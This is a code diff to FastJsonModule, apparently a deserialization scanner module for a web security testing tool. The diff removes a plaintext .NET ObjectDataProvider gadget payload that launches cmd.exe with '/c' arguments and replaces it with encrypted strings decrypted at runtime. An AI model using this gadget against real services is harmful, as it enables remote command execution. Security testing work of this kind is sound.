@@ -22,8 +22,8 @@ import java.util.regex.Pattern;
  **********************************************************/
 public class FastJsonModule extends FreddyModuleBase {
     //ObjectDataProvider payload data
-    private static final String OBJD_PREFIX = "{\"$types\":{\"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = 31bf3856ad364e35\":\"1\",\"System.Diagnostics.Process, System, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089\":\"2\", \"System.Diagnostics.ProcessStartInfo, System, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089\":\"3\"},\"$type\":\"1\",\"ObjectInstance\":{\"$type\":\"2\",\"StartInfo\":{\"$type\":\"3\",\"FileName\":\"cmd.exe\",\"Arguments\":\"/c ";
-    private static final String OBJD_SUFFIX = "\"}},\"MethodName\":\"Start\"}";
+    private final String OBJD_PREFIX = decrypt("+ZeiRj2w+ENQ5T4sDMUxElZcms4vh5UAagpkxv2uLtqc0YBFf+Yf8FkyMF2utnQg5qq0tHsSYNGH4joITl+UMsj86LO6045pi3+m+sz3y31857z428buk+SiEHB6HjMEomZEG3ePWp8X3JId8cvq4XVQsJy0oqJFcxRCxAo0jXQpltNtVzJQjKVQVA9W0hXXYf1lNrD8l4jPDcL0rggE5zgZIhdNkBtrZa/EqL4SeXDC1hNZ6Ymul0DctQc4lM2Q5PK4ESuKdaw7a8gQiRHkDduHzSFTrvGVo7k5Dvsu5cndfp5z9DrI95k0pS/BagQeGjWE5MeXVLEw9CELyJ3ZqoOnVpRBOk5SEJfyR5nsufn2KxSLrGX136H1jD+KjO/lNWEmm2KHQZOdK41j24FPcX2lIJzCZ9ecfteIqd2JjNfsMf/0zdSg/RgRCViueBc/LlCaA62zHv2wIO0Csk6mTR1YOa3wdFisFQ7emATRzdgH25YV1Kaz7lPMfS7DG49xnBWtZrX5Y4PlYE0H5eyn1gZSwHstzr8bJvF06ikWsk/Rftzzekgy51sQnVdSXflorvprXddTdJE3jxgtq3Wqap+7jPWkMULNnR0FkEcxORraewbu6JlMevLuGmWV2HbOxk3U/yw5EvK+MPMECfLDFg==");
+    private final String OBJD_SUFFIX = decrypt("4cfckJ2ZaI/SVCDmUt8wOHtNYdPDffPQ7l8QG/Qsh6c=");
 
     protected void initialiseModule() {
         setName("FastJson");
